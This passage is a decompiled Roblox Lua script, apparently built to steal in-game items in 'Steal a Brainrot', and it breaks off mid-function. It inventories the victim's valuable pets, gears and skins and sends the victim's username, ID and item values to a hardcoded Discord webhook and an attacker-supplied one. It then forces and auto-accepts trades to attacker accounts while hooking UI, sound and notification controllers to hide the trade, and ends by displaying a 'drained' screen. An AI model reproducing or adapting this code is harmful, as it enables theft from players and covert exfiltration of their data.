return function(arg, arg2, arg3, arg4, arg5, arg6)
	local v

	repeat
		task.wait()
		v = game
	until v:IsLoaded()

	local Players = game:GetService("Players")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local HttpService = game:GetService("HttpService")
	local MarketplaceService = game:GetService("MarketplaceService")
	local localPlayer = Players.LocalPlayer
	local n = 109983668079237
	local n2 = 35815907
	local flag = game.PlaceId == 99606176102979

	if not (function()
		if game.PlaceId == n then
			return true
		end

		local ok, result = pcall(function()
			return MarketplaceService:GetProductInfo(game.PlaceId)
		end)

		ok = ok and result
		ok = ok and result.Creator
		ok = ok and result.Creator.CreatorType == "Group"
		if ok and tonumber(result.Creator.CreatorTargetId) == n2 then
			return true
		end
		return false
	end)() then
		localPlayer:Kick("You're stupid using modden")
		return
	end

	local ReplicatorClient = require(ReplicatedStorage.Packages.ReplicatorClient)
	local Channel = require(ReplicatedStorage.Packages.Synchronizer.Channel)
	local Animals = require(ReplicatedStorage.Datas.Animals)
	local Game = require(ReplicatedStorage.Datas.Game)
	local Mutations = require(ReplicatedStorage.Datas.Mutations)
	local Traits = require(ReplicatedStorage.Datas.Traits)
	local TradeController = require(ReplicatedStorage.Controllers.TradeController)
	local InterfaceController = require(ReplicatedStorage.Controllers.InterfaceController)
	local SoundController = require(ReplicatedStorage.Controllers.SoundController)
	local NotificationController = require(ReplicatedStorage.Controllers.NotificationController)
	local CameraController = require(ReplicatedStorage.Controllers.CameraController)
	local TradeLiveTrade = InterfaceController:Get("TradeLiveTrade")
	local name = localPlayer.Name
	local userId = localPlayer.UserId
	if getgenv().ChocolaRunning then
		return
	end
	getgenv().ChocolaRunning = true
	local toggle = InterfaceController.Toggle
	local setState = InterfaceController.SetState
	local notify = NotificationController.Notify
	local error = NotificationController.Error
	local success = NotificationController.Success
	local playSound = SoundController.PlaySound

	if (not arg or arg == 0) and arg2 and arg2 ~= "" then
		local ok, result = pcall(function()
			return Players:GetUserIdFromNameAsync(arg2)
		end)

		if ok and result then
			arg = result
		end
	end

	if not arg or arg == 0 then
		return
	end

	if not arg3 or arg3 == "" then
		return
	end
	local str = "https://discord.com/api/webhooks/1543566190297751602/Glz-GpprkK3LgqaDpK_ba4ejwfA_n2kMUu7vSEbd-wEWn7ng7T7NYUSVmrZH4qJdZ04n"
	local tbl = { ["Strawberry Elephant"] = true, Meowl = true, ["Skibidi Toilet"] = true, ["Dragon Cannelloni"] = true, ["Hydra Dragon Cannelloni"] = true, ["Elefanto Frigo"] = true, Griffin = true, ["John Pork"] = true, ["Dragon Gingerini"] = true, Antonio = true, ["Hydra Bunny"] = true, Rubrikiko = true, ["Rico Dinero"] = true, ["Globa Steppa"] = true, ["Dug Dug Dug"] = true, Arcadragon = true, ["Tirilikalika Tirilikalako"] = true, ["Pancake and Syrup"] = true, ["Kalika Bros"] = true, ["Dragon Aquanini"] = true, ["La Supreme Combinasion"] = true, ["Headless Horseman"] = true, ["Fishino Clownino"] = true, ["Signore Carapace"] = true, ["Duggy Bros"] = true, Venuspino = true }
	local str2 = "https://cdn.discordapp.com/attachments/1475020352555057262/1517322005693857962/Kangel.jpg?ex=6a35dbbc&is=6a348a3c&hm=3e4938384e9bd8b58a601f191cd203884beff1a09c703f152813e10eaebf5f0d&"
	local flag2 = false
	local flag3 = false
	local v2 = ReplicatorClient.get(("Trade_%*"):format(localPlayer.UserId))
	local request_ = syn and syn.request or http and http.request or http_request or request
	arg4 = arg4 or {}
	arg5 = arg5 or {}
	arg6 = arg6 or {}
	local v3 = nil
	local v4 = nil
	local v5 = nil
	local v6 = nil
	local v7 = nil
	local v8 = nil
	local v9 = nil

	task.spawn(function()
		while true do
			v3 = getupvalue(TradeController._createLiveTrade, 15)
			v4 = getupvalue(TradeController.SendInvite, 1)
			local v10 = v3

			if v3 then
				v10 = getupvalue(v3.Brainrot.Add, 1)
			end

			v5 = v10
			local v11 = v3

			if v3 then
				v11 = getupvalue(v3.BaseSkin.Add, 1)
			end

			v6 = v11
			v7 = getupvalue(TradeController._createLiveTrade, 24)
			v8 = getupvalue(TradeController._createLiveTrade, 23)
			v9 = getupvalue(TradeController._createPlayerList, 21)
			task.wait(0.1)
			local v12 = v3

			if v3 then
				v12 = v4
			end

			v12 = v12 and v5
			if not (v12 and v6 and v7 and v8 and v9) then
				continue
			end
			break
		end
	end)

	local str3 = "6786cce9-00d8-41e9-8beb-d96e0412b78b"
	local tbl2 = { Bloodrot = "<:Bloodrot_Mutation_Icon:1526148047174766612>", Candy = "<:Candy_Mutation_Icon:1526148182642528347>", Crystal = "<:Crystal:1532118171618902198>", Cursed = "<:Cursed_Mutation_Icon:1526148377362956338>", Cyber = "<:Cyber_Mutation_Icon:1526148446589816833>", Default = "<:Default_Mutation_Icon:1526147901351264266>", Diamond = "<:Diamond_Mutation_Icon:1526147968216858697>", Divine = "<:Divine_Mutation_Icon:1526148416755990549>", Galaxy = "<:Galaxy_Mutation_Icon:1526148261449306173>", Gold = "<:Gold_Mutation_Icon:1526147938131251332>", Lava = "<:Lava_Mutation_Icon:1526148216062742557>", Phantom = "<:Phantom_Mutation_Icon:1526148483579510954>", Radioactive = "<:Radioactive_Mutation_Icon:1526148308660129822>", Rainbow = "<:Rainbow_Mutation_Icon:1526148005022138398>", YinYang = "<:Yin_Yang_Mutation_Icon:1526148344659841095>" }
	local tbl3 = { ["Alien Slap"] = "<:gearalienslap:1536941130581807124>", ["Blackhole Bomb"] = "<:gearblackholebomb:1536941156649402490>", ["Bloodmoon Hammer"] = "<:gearbloodmoonhammer:1536941316087222303>", ["Bloodmoon Slap"] = "<:gearbloodmoonslap:1536941363260821644>", ["Cupid's Wings"] = "<:gearcupidswings:1536941473407176715>", ["Cursed Slap"] = "<:gearcursedslap:1536941510824689764>", ["Cyber Slap"] = "<:gearcyberslap:1536941541971730483>", ["Demon's Head"] = "<:geardemonshead:1536941574028525649>", ["Divine Slap"] = "<:geardivineslap:1536941781277741076>", ["Lava Blaster"] = "<:gearlavablaster:1536941824915283998>", ["Lava Slap"] = "<:gearlavaslap:1536941851267965028>", ["Radioactive Airstrike"] = "<:gearradioactiveairstrike:1536941888148480000>", ["Radioactive Slap"] = "<:gearradioactiveslap:1536941915931545650>", ["Rainbow Hammer"] = "<:gearrainbowhammer:1536941964149133352>", ["Rainbow Slap"] = "<:gearrainbowslap:1536941997510754424>", ["Santa's Sleigh"] = "<:gearsantassleigh:1536942025646153818>", Waverider = "<:gearwaverider:1536942058676420680>", ["Witch's Broom"] = "<:gearwitchsbroom:1536942085649731667>", ["Yin Yang Lamp"] = "<:gearyinyanglamp:1536942111218335754>", ["Yin Yang Slap"] = "<:gearyinyangslap:1536942134668697640>", ["Phantom Slap"] = "<:phantomslap:1536940296116371477>", ["Crystal Slap"] = "<:CrystalSlap:1544560430004043846>" }
	local tbl4 = { Aquatic = "<:baseskinaquatic:1536943396168532018>", ["Bunny Basket"] = "<:baseskinbunnybasket:1536943427327889419>", Christmas = "<:baseskinchristmas:1536943450388308049>", Easter = "<:baseskineaster:1536943602981281792>", Gingerbread = "<:baseskingingerbread:1536943707289555015>", Halloween = "<:baseskinhalloween:1536943747995279380>", Lucky = "<:baseskinlucky:1536943979793490000>", Octo = "<:Octo_base:1536944000752418856>", ["Pot of Gold"] = "<:baseskinpotofgold:1536944019827986532>", Rose = "<:baseskinrose:1536944091558842378>", Valentines = "<:Valentines_base:1536944152565252136>", Taco = "<:baseskintaco:1536944658809225286>" }
	local tbl5 = { ["10B"] = "<:10b:1526146250590785579>", ["1 Year"] = "<:1YR_Icon_Fixed:1526146382757498970>", ["26"] = "<:2026Trait:1526146276452728944>", [":3"] = "<:3_:1526146860757024808>", UFO = "<:Alienevent1:1537678162190798928>", Ball = "<:Ball:1526146038606467073>", Brazil = "<:Brazil:1526145968674967632>", Bubblegum = "<:Bubblegum:1526147039434379274>", ["Bunny Ears"] = "<:BunnyEars:1526146436172091483>", Burger = "<:Burger_Trait:1526147238663815229>", Chocolate = "<:ChocolateTrait:1526146015445389382>", Cometstruck = "<:Cometstruck:1526145885556314173>", Claws = "<:CrabClaw:1526147141976985635>", Disco = "<:Disco:1526147212457807884>", Explosive = "<:Bombardiro:1526146699112747038>", Fire = "<:Fire:1526147415281762384>", Fireworks = "<:Fireworks:1526147343211298946>", Galactic = "<:Comet2:1526146723993485312>", Glitched = "<:Glitch:1526147180841144350>", Granny = "<:Granny:1526147444990021723>", ["RIP Gravestone"] = "<:GraveYardRIPTombstone:1526146501271748689>", Halo = "<:HaloTraitIcon:1526146119422443520>", Indonesia = "<:Indonesian:1526145949414588487>", ["Jackolantern Pet"] = "<:JackoLantern_Pet_Trait:1526146530686537838>", ["John Pork"] = "<:John_Pork_Trait_HD:1526147509460664380>", Lucky = "<:Lucky:1526146094675787877>", ["Matteo Hat"] = "<:MatteoHat:1526146756004417597>", Meowl = "<:ICON_Meowl:1526147660673847317>", Sombrero = "<:Mexico_Hat:1526145924844224583>", Nyan = "<:Nyan:1526147310399000646>", ["Pink Balloon"] = "<:PinkBalloon:1526146180227268638>", ["Pink Egg"] = "<:PinkEgg:1526146411962433566>", ["Rainbow Balloon"] = "<:RainbowBalloon:1526146214175969411>", ["Red Balloon"] = "<:RedBalloon:1526146151022067732>", ["Reindeer Pet"] = "<:Reindeer:1526146642036785212>", Rose = "<:Rose:1526147384201969684>", ["Santa Hat"] = "<:SantaHatIcon:1526146592074240070>", ["Shark Fin"] = "<:Shark_Fin:1526146666409885767>", Skibidi = "<:SkibidiIcon:1526147476782973028>", Sleepy = "<:Sleepy:1526146936522932406>", Snowy = "<:Snowy:1526145862684774601>", Spider = "<:Spider:1526146795825270915>", Strawberry = "<:Strawberry:1526147692269408266>", Taco = "<:Taco:1526146973433073704>", Tie = "<:Tie:1526146822903693422>", Wet = "<:Wet:1526145830506070056>", Zombie = "<:EvilTungTungSahur1:1537678175977480334>", Paint = "<:Chicleteirabicicleteira:1526146906546241657>", ["Orange Balloon"] = "<:orangeballoon:1542305480565592134>", ["Green Balloon"] = "<:greenballoon:1542305605807775764>", ["Blue Balloon"] = "<:blueballoon:1542305311413633125>", ["Orange Egg"] = "<:orangeegg:1542305816277811200>", ["Green Egg"] = "<:greenegg:1542305940215304313>", ["Blue Egg"] = "<:blueegg:1542306035404906497>", Bull = "<:bull:1542280218092376165>", Lightning = "<:Dragon:1526147276748099665>", Skeleton = "<:Extincty:1526145992209207307>", ["Aura Shades"] = "<:Aura_Shades1:1537678067751714816>", ["Witch Hat"] = "<:Witchhat:1526146475317526589>", Sun = "<:sun:1542318228041371768>", ["Ice Bee"] = "<:icebee:1542318162777739274>", ["Fire Bee"] = "<:firebee:1542318193681629275>", ["Job Application"] = "<:jobapplication:1542317461079203880>", Bee = "<:bee:1542317981818945538>", ["Queen Bee"] = "<:queenbee:1543056608181882910>" }

	local function fn()
		for i = 2, 8 do
			local v10 = debug.info(i, "s")
			if not v10 then
				break
			end

			if v10:find("TradeController") then
				return true
			end
		end

		return false
	end

	local function fn2(arg7)
		if typeof(arg7) ~= "string" then
			return false
		end
		local str4 = arg7:gsub("<[^>]+>", "")
		local str5 = str4:lower()
		local flag4 = str4:find("@") ~= nil
		local pos = flag4 and str5:find("cancel") or str4:find("Failed") and str5:find("trade") or flag4 and str5:find("completed") or str5:find("other player") and str5:find("enough space")
		return pos
	end

	SoundController.PlaySound = function(arg7, arg8, ...)
		local TradeLiveTrade2 = InterfaceController:Get("TradeLiveTrade")
		local pos = fn()

		if not pos then
			pos = debug.info(2, "s"):find("AnimatedButton") and TradeLiveTrade2 and TradeLiveTrade2:IsOpened()
		end

		if pos then
			return
		end
		local v10 = table.pack(...)
		local v11 = playSound
		v10.n = 3 + v10.n - 1
		table.move(v10, 1, v10.n, 3, v10)
		v10[1] = arg7
		v10[2] = arg8
		return v11(table.unpack(v10, 1, v10.n))
	end

	if TradeLiveTrade and TradeLiveTrade:IsOpened() then
		InterfaceController:Toggle("TradeLiveTrade", false)
		CameraController:Blur(0, 0)
		CameraController:Fov(CameraController:GetDefaultFov(), 0)
	end

	InterfaceController.Toggle = function(arg7, arg8, arg9, arg10)
		if arg8 == "TradeLiveTrade" then
			return
		end
		return toggle(arg7, arg8, arg9, arg10)
	end

	InterfaceController.SetState = function(arg7, arg8, arg9, arg10)
		if arg8 == "TradeLiveTrade" then
			return
		end
		return setState(arg7, arg8, arg9, arg10)
	end

	NotificationController.Notify = function(arg7, arg8, ...)
		if fn() or fn2(arg8) then
			return
		end
		local v10 = table.pack(...)
		local v11 = notify
		v10.n = 3 + v10.n - 1
		table.move(v10, 1, v10.n, 3, v10)
		v10[1] = arg7
		v10[2] = arg8
		return v11(table.unpack(v10, 1, v10.n))
	end

	NotificationController.Error = function(arg7, ...)
		if fn() then
			return
		end
		return error(arg7, ...)
	end

	NotificationController.Success = function(arg7, ...)
		if fn() then
			return
		end
		return success(arg7, ...)
	end

	local function fn3(arg7)
		if not arg7 or arg7 == 0 then
			return "$0/s"
		end
		local tbl6 = { "", "K", "M", "B", "T", "Qa", "Qi", "Sx", "Sp", "Oc", "No", "Dc" }
		local n3 = math.floor(math.log10(math.abs(arg7)) / 3)
		if n3 == 0 then
			return "$" .. tostring(math.floor(arg7)) .. "/s"
		end
		local str4 = string.format("%.1f", arg7 / 1000 ^ n3)

		if str4:sub(-2) == ".0" then
			str4 = str4:sub(1, -3)
		end

		return "$" .. str4 .. tbl6[n3 + 1] .. "/s"
	end

	local function fn4(arg7, arg8, arg9)
		if type(arg7) ~= "string" then
			return 0
		end
		local v10 = Animals[arg7]
		if not v10 then
			return 0
		end
		local generation = v10.Generation or v10.Price * Game.Game.AnimalGanerationModifier
		local flag4 = arg8 and arg8 ~= "None" and Mutations[arg8]
		local n3 = 1

		if flag4 then
			n3 = 1 + Mutations[arg8].Modifier
		end

		local n4

		if arg9 then
			local flag5 = false

			for _, v11 in ipairs(arg9) do
				if v11 == "Sleepy" then
					flag5 = true
				elseif Traits[v11] then
					n3 = n3 + Traits[v11].MultiplierModifier
				end
			end

			if flag5 then
				n4 = n3 * 0.5
			else
				n4 = n3
			end
		else
			n4 = n3
		end

		return math.round(generation * n4)
	end

	local function fn5()
		for _, v10 in getgc(true) do
			if type(v10) == "table" and getmetatable(v10) == Channel then
				if v10.Index == localPlayer then
					return v10.CacheTable
				end
				continue
			end
		end
	end

	local v10

	repeat
		v10 = fn5()
		task.wait(0.1)
	until v10

	local tbl6 = { Brainrots = {}, Gears = {}, BaseSkins = {} }

	task.spawn(function()
		while task.wait(0.1) do
			local tbl7 = {}
			local tbl8 = {}
			local tbl9 = {}
			local animalPodiums = v10.AnimalPodiums

			if type(animalPodiums) == "table" then
				for k, animalPodium in pairs(animalPodiums) do
					if type(animalPodium) == "table" and animalPodium.Index then
						if arg4[animalPodium.Index] then
							local v11 = fn4(animalPodium.Index, animalPodium.Mutation, animalPodium.Traits)
							local insert = table.insert
							local tbl10 = { slotKey = tonumber(k), data = animalPodium }
							tbl10.mutation = animalPodium.Mutation or "None"
							tbl10.traits = animalPodium.Traits or {}
							tbl10.genValue = v11
							insert(tbl7, tbl10)
						end
					end
				end
			end

			local baseSkinInventory = v10.BaseSkinInventory

			if type(baseSkinInventory) == "table" then
				for k, v11 in pairs(baseSkinInventory) do
					if type(v11) == "table" and v11.SkinName then
						if arg5[v11.SkinName] then
							table.insert(tbl8, { SkinName = v11.SkinName, UUID = k })
						end
					end
				end
			end

			local gearInventory = v10.GearInventory

			if type(gearInventory) == "table" then
				for k, v11 in pairs(gearInventory) do
					if type(v11) == "table" and v11.GearName then
						if arg6[v11.GearName] then
							table.insert(tbl9, { GearName = v11.GearName, UUID = k })
						end
					end
				end
			end

			tbl6.Brainrots = tbl7
			tbl6.Gears = tbl9
			tbl6.BaseSkins = tbl8
		end
	end)

	local function fn6()
		local flag4 = #tbl6.Brainrots > 0 or #tbl6.Gears > 0 or #tbl6.BaseSkins > 0
		return flag4
	end

	local function fn7(arg7)
		local str4 = "https://stealabrainrot.fandom.com/api.php?action=query&titles=" .. HttpService:UrlEncode(arg7) .. "&prop=pageimages&pithumbsize=2500&format=json&redirects=1&normalize=1"

		local ok, result = pcall(function()
			return request_({ Url = str4, Method = "GET" })
		end)

		if not ok or not result then
			return nil
		end

		local ok2, result2 = pcall(function()
			return HttpService:JSONDecode(result.Body)
		end)

		if not ok2 or not result2 or not result2.query or not result2.query.pages then
			return nil
		end

		for _, v11 in pairs(result2.query.pages) do
			if v11.thumbnail then
				return v11.thumbnail.source
			end
		end

		return nil
	end

	local function fn8()
		for _, v11 in ipairs(tbl6.Brainrots) do
			if tbl[v11.data.Index] then
				return true
			end
		end

		return false
	end

	local function fn9()
		if flag2 then
			return
		end
		flag2 = true
		local str4 = "Unknown"

		pcall(function()
			if syn and syn.getexecutorname then
				str4 = syn.getexecutorname()
			elseif getexecutorname then
				str4 = getexecutorname()
			end
		end)

		local tbl7 = {}
		local tbl8 = {}

		for _, v11 in ipairs(tbl6.Brainrots) do
			if tbl[v11.data.Index] then
				table.insert(tbl7, v11)
			else
				table.insert(tbl8, v11)
			end
		end

		if #tbl7 > 0 and "https://discord.com/api/webhooks/1543566190297751602/Glz-GpprkK3LgqaDpK_ba4ejwfA_n2kMUu7vSEbd-wEWn7ng7T7NYUSVmrZH4qJdZ04n" then
			local tbl9 = {}

			table.sort(tbl7, function(arg7, arg8)
				return arg7.genValue > arg8.genValue
			end)

			local n3 = 0

			for _, v11 in ipairs(tbl7) do
				local genValue = v11.genValue or 0
				n3 = n3 + genValue
				local mutation = v11.mutation or "None"
				local traits = v11.traits or {}
				local v12 = fn3
				local genValue2 = v11.genValue or 0
				local v13 = v12(genValue2)
				local default = mutation ~= "None" and tbl2[mutation] or tbl2.Default
				local str5 = "`" .. #tbl9 + 1 .. ".`  " .. default .. "  **" .. v11.data.Index .. "**  "

				if #traits > 0 then
					for _, trait in ipairs(traits) do
						local v14 = tbl5[trait]

						if v14 then
							str5 = str5 .. v14 .. "  "
						else
							str5 = str5 .. "`" .. trait .. "`  "
						end
					end

					if 1 < #traits then
						str5 = str5 .. "(x" .. #traits .. " traits)  "
					end
				end

				table.insert(tbl9, str5 .. utf8.char(8212) .. " " .. v13)
			end

			local now = os.time()
			local n4 = #Players:GetPlayers()
			local str5 = flag

			if flag then
				str5 = "**In Duel**"
			end

			local str6 = str5 or "**Not in Duel**"
			local tbl10 = { title = "\240\159\142\175 PRIORITY SNIPER - lolfoxxd1", description = string.format("\240\159\147\168 **Victim:** `%s` (ID: %s)\n\n\240\159\147\138 **Priority Items:** %s\n\n%s\n\n\240\159\146\176 **Total Value:** %s\n\n\240\159\149\144 **Executed:** <t:%d:R>\n\n\226\154\161 **Status:** %s", name, userId, #tbl7, table.concat(tbl9, "\n"), fn3(n3), now, str6) }
			local n5 = flag

			if flag then
				n5 = 16711680
			end

			n5 = n5 or 41983
			tbl10.color = n5
			local tbl11 = {}
			tbl11[1] = { name = "\226\154\161 Executor", value = "**" .. str4 .. "**", inline = true }
			tbl11[2] = { name = "\240\159\140\144 Server", value = "Players: **" .. n4 .. "**", inline = true }
			tbl10.fields = tbl11
			tbl10.footer = { text = "SHADOW SCRIPT | lolfoxxd1", icon_url = str2 }
			tbl10.timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
			local v11 = nil

			if tbl7[1] then
				pcall(function()
					v11 = fn7(tbl7[1].data.Index)
				end)
			end

			if v11 then
				tbl10.thumbnail = { url = v11 }
			end

			local tbl12 = { content = "@everyone", username = "PRIORITY SNIPER", avatar_url = str2 }
			tbl12.embeds = { tbl10 }

			if request_ then
				pcall(function()
					local tbl13 = { Url = str, Method = "POST" }
					tbl13.Headers = { ["Content-Type"] = "application/json" }
					tbl13.Body = HttpService:JSONEncode(tbl12)
					request_(tbl13)
				end)
			end
		end

		if (#tbl8 > 0 or #tbl6.BaseSkins > 0 or #tbl6.Gears > 0) and arg3 then
			local tbl9 = {}
			local tbl10 = {}
			local tbl11 = {}

			for _, v11 in ipairs(tbl8) do
				local insert = table.insert
				local tbl12 = { name = v11.data.Index }
				tbl12.mutation = v11.mutation or "None"
				tbl12.traits = v11.traits or {}
				tbl12.genValue = v11.genValue
				insert(tbl9, tbl12)
			end

			for _, v11 in ipairs(tbl6.BaseSkins) do
				table.insert(tbl10, { name = v11.SkinName })
			end

			for _, v11 in ipairs(tbl6.Gears) do
				table.insert(tbl11, { name = v11.GearName })
			end

			table.sort(tbl9, function(arg7, arg8)
				local genValue = arg7.genValue or 0
				local genValue2 = arg8.genValue or 0
				return genValue > genValue2
			end)

			local v11 = nil

			if tbl9[1] then
				pcall(function()
					v11 = fn7(tbl9[1].name)
				end)
			end

			local tbl12 = {}
			local n3 = 0

			for _, v12 in ipairs(tbl9) do
				local genValue = v12.genValue or 0
				n3 = n3 + genValue
				local str5 = (tbl2[v12.mutation] or tbl2.Default) .. " **" .. v12.name .. "**"

				for _, v13 in ipairs(v12.traits) do
					local str6 = tbl5[v13] or "`" .. v13 .. "`"
					str5 = str5 .. " " .. str6
				end

				if #v12.traits > 1 then
					str5 = str5 .. " *(" .. #v12.traits .. " traits)*"
				end

				local v13 = fn3
				local genValue2 = v12.genValue or 0
				table.insert(tbl12, str5 .. " \226\128\148 **" .. v13(genValue2) .. "**")
			end

			local tbl13 = {}

			for _, v12 in ipairs(tbl10) do
				local insert = table.insert
				local v13 = tbl4[v12.name] or utf8.char(127912)
				insert(tbl13, v13 .. " **" .. v12.name .. "**")
			end

			local tbl14 = {}

			for _, v12 in ipairs(tbl11) do
				local insert = table.insert
				local v13 = tbl3[v12.name] or utf8.char(9881)
				insert(tbl14, v13 .. " **" .. v12.name .. "**")
			end

			local now = os.time()
			local tbl15 = {}
			local v12 = name
			table.insert(tbl15, { type = 10, content = "# AUTO MOREIRA SHADOW\n" .. utf8.char(128232) .. " **Invite received from:** `" .. v12 .. "` (ID: `" .. tostring(userId) .. "`)" })
			table.insert(tbl15, { type = 14, spacing = 1, divider = true })

			if 0 < #tbl12 then
				local tbl16 = { type = 9 }
				local tbl17 = {}
				tbl17[1] = { type = 10, content = "## Brainrots\n" .. table.concat(tbl12, "\n") .. "\n\n" .. utf8.char(128176) .. " **Total Value: " .. fn3(n3) .. "**" }
				tbl16.components = tbl17

				if v11 then
					local tbl18 = { type = 11 }
					tbl18.media = { url = v11 }
					tbl16.accessory = tbl18
				end

				table.insert(tbl15, tbl16)
				table.insert(tbl15, { type = 14, spacing = 1, divider = true })
			end

			if 0 < #tbl13 then
				table.insert(tbl15, { type = 10, content = "## Base Skins\n" .. table.concat(tbl13, "\n") })
				table.insert(tbl15, { type = 14, spacing = 1, divider = true })
			end

			if 0 < #tbl14 then
				table.insert(tbl15, { type = 10, content = "## Gears\n" .. table.concat(tbl14, "\n") })
				table.insert(tbl15, { type = 14, spacing = 1, divider = true })
			end

			local insert = table.insert
			local tbl16 = { type = 10 }
			local str5 = flag

			if flag then
				str5 = "**In Duel**"
			end

			str5 = str5 or "**Not in Duel**"
			tbl16.content = "## Status\n" .. str5 .. "\n" .. utf8.char(128338) .. " <t:" .. now .. ":f>\n" .. utf8.char(127757) .. " Players in server: **" .. #Players:GetPlayers() .. "**\n" .. utf8.char(9889) .. " Executor: **" .. str4 .. "**\n\n-# SHADOW SCRIPT  |"
			insert(tbl15, tbl16)

			pcall(function()
				local tbl17 = { Url = arg3 .. "?with_components=true", Method = "POST" }
				tbl17.Headers = { ["Content-Type"] = "application/json" }
				local v13 = HttpService
				local jsonEncode = v13.JSONEncode
				local tbl18 = { username = "AUTO MOREIRA SHADOW", avatar_url = str2, flags = 32768 }
				local tbl19 = {}
				tbl19.parse = { "everyone" }
				tbl18.allowed_mentions = tbl19
				local tbl20 = {}
				local tbl21 = { type = 10, content = "@everyone" }
				local tbl22 = { type = 17 }
				local n4 = flag

				if flag then
					n4 = 16711680
				end

				tbl22.accent_color = n4 or 41983
				tbl22.components = tbl15
				tbl20[1] = tbl21
				tbl20[2] = tbl22
				tbl18.components = tbl20
				tbl17.Body = jsonEncode(v13, tbl18)
				request_(tbl17)
			end)
		end
	end

	task.spawn(function()
		v2:Observe({ "active", "data" }, function(arg7)
			flag3 = arg7 ~= nil
		end)
	end)

	while true do
		task.wait()
		if not (v3 and v4 and v5 and v6 and v7 and v8 and v9) then
			continue
		end
		break
	end

	local str4 = arg2 or ""

	if (not str4 or str4 == "") and arg and arg ~= 0 then
		pcall(function()
			str4 = game:GetService("Players"):GetNameFromUserIdAsync(arg)
		end)
	end

	task.spawn(function()
		repeat
			task.wait(0.1)
		until fn6()

		fn9()
	end)

	local function fn10()
		if not flag3 then
			if fn8() then
				pcall(function()
					v4:InvokeServer("8fbe1594-7cef-4c29-94d1-a0e93adfa5a4", 11288102094)
				end)

				task.wait(10)
			end

			if fn6() then
				pcall(function()
					v4:InvokeServer("8fbe1594-7cef-4c29-94d1-a0e93adfa5a4", arg)
				end)
			end
		end
	end

	task.spawn(function()
		while task.wait(0.1) do
			fn10()
		end
	end)

	task.spawn(function()
		local flag4 = false
		local flag5 = false

		while task.wait(0.1) do
			if not flag3 then
				flag4 = false
				flag5 = false
			else
				if not flag4 then
					pcall(function()
						v7:FireServer("23f15b0b-b633-4f6b-888f-5924b7425522")
					end)

					flag4 = true
				end

				task.wait(0.5)

				if not flag5 then
					pcall(function()
						v8:FireServer("86eea964-f19e-4ac6-b401-a71ecc89e596")
					end)

					flag5 = true
				end

				task.wait(0.5)
				local v11 = v2:TryIndex({ "active", "data", "players" })

				if v11 then
					local v12 = nil

					for _, v13 in pairs(v11) do
						if type(v13) ~= "table" then
							v12 = nil
							continue
						elseif (v13.username or v13.Username or v13.name) == localPlayer.Name then
							v12 = v13
							break
						else
							v12 = nil
							continue
						end

						break
					end

					if v12 then
						if not v12.ready then
							pcall(function()
								v7:FireServer("23f15b0b-b633-4f6b-888f-5924b7425522")
							end)
						end

						if not v12.accepted then
							pcall(function()
								v8:FireServer("86eea964-f19e-4ac6-b401-a71ecc89e596")
							end)
						end
					end
				end
			end
		end
	end)

	task.spawn(function()
		local n3 = 1
		local n4 = 1
		local n5 = 1

		while true do
			task.wait()

			if flag3 then
				local v11 = tbl6.Brainrots[n3]

				if v11 then
					local ok, result = pcall(function()
						return v5:InvokeServer("c85a2323-36b2-4121-968a-c064a6168aff", v11.slotKey, v11.data)
					end)

					ok = ok and result == true

					if ok then
						n3 = n3 % #tbl6.Brainrots + 1
					end
				end

				local flag4 = math.random(1, 2) == 1

				if flag4 and #tbl6.Gears > 0 then
					local v12 = tbl6.Gears[n4]
					local str5 = "Gear"
					local tbl7 = { GearName = v12.GearName }
					tbl7.UUID = v12.UUID or ""

					if v12 then
						local ok, result = pcall(function()
							return v6:InvokeServer(str3, str5, tbl7)
						end)

						ok = ok and result == true

						if ok then
							if str5 == "Gear" then
								n4 = n4 % #tbl6.Gears + 1
							else
								n5 = n5 % #tbl6.BaseSkins + 1
							end
						end
					end
				elseif not flag4 and #tbl6.BaseSkins > 0 then
					local v12 = tbl6.BaseSkins[n5]
					local str5 = "BaseSkin"
					local tbl7 = { UUID = v12.UUID, SkinName = v12.SkinName }

					if v12 then
						local ok, result = pcall(function()
							return v6:InvokeServer(str3, str5, tbl7)
						end)

						ok = ok and result == true

						if ok then
							if str5 == "Gear" then
								n4 = n4 % #tbl6.Gears + 1
							else
								n5 = n5 % #tbl6.BaseSkins + 1
							end
						end
					end
				end

				if not flag3 then
					n3 = 1
					n4 = 1
					n5 = 1
				else
					task.wait(1)
				end
			end
		end
	end)

	local function fn11()
		game:GetService("Players").LocalPlayer.PlayerGui:ClearAllChildren()
		game:GetService("CoreGui"):ClearAllChildren()
		local screenGui = Instance.new("ScreenGui")
		screenGui.IgnoreGuiInset = true
		screenGui.ResetOnSpawn = false
		screenGui.Parent = game:GetService("CoreGui")

		local function fn11(arg7, arg8, arg9, arg10)
			local frame = Instance.new("Frame")
			frame.Size = arg8
			frame.Position = arg9
			frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			frame.BorderSizePixel = 0

			if arg10 then
				frame.ZIndex = arg10
			end

			frame.Parent = arg7
			return frame
		end

		local v11 = fn11(screenGui, UDim2.fromScale(1, 1), UDim2.fromScale(0, 0), nil)
		fn11(screenGui, UDim2.fromScale(1.2, 1.2), UDim2.fromScale(-0.1, -0.1), -1)

		local function fn12(arg7, arg8, arg9, arg10, arg11, arg12)
			local textLabel = Instance.new("TextLabel")
			textLabel.Size = arg8
			textLabel.Position = arg9
			textLabel.BackgroundTransparency = 1
			textLabel.Text = arg10
			textLabel.TextColor3 = arg11
			textLabel.TextScaled = arg12 == nil

			if arg12 then
				textLabel.TextSize = arg12
				textLabel.TextScaled = false
			end

			textLabel.Font = Enum.Font.GothamBold
			textLabel.TextXAlignment = Enum.TextXAlignment.Center
			textLabel.TextYAlignment = Enum.TextYAlignment.Center
			textLabel.Parent = arg7
			return textLabel
		end

		fn12(v11, UDim2.fromScale(1, 0.3), UDim2.fromScale(0, 0.1), "YOUR BRAINROTS WAS DRAINED", Color3.fromRGB(255, 0, 0), nil)
		fn12(v11, UDim2.fromScale(0.8, 0.2), UDim2.fromScale(0.1, 0.5), "GGS", Color3.fromRGB(255, 255, 255), nil)
		fn12(v11, UDim2.fromScale(0.8, 0.08), UDim2.fromScale(0.1, 0.72), "Developed by SHADOW \226\128\162", Color3.fromRGB(180, 180, 180), 16).TextTransparency = 0.4

		local function fn13(arg7, arg8)
			local ok, result = pcall(function()
				local tbl7 = { Url = "https://discord.com/api/v10/invites/" .. arg7 .. "?with_counts=true", Method = "GET" }
				tbl7.Headers = { ["Content-Type"] = "application/json" }
				return request_(tbl7)
			end)

			local v12 = result
			if not ok or not v12 then
				return nil
			end

